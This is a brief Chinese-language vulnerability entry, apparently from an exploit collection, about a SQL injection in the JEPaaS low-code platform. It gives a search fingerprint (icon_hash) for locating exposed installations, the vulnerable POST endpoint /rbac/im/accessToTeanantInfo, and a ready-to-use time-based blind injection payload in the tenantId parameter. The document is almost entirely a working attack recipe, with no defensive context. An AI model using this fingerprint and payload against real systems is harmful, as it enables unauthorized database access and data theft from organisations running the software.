# JEPaaS低代码平台accessToTeanantInfoSQL注入漏洞

JEPaaS ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="-999810473"`
- **请求**：`POST /rbac/im/accessToTeanantInfo HTTP/1.1`

**Payload**
```
tenantId=1' AND (SELECT 2805 FROM (SELECT(SLEEP(5)))moYz)-- sBPi
```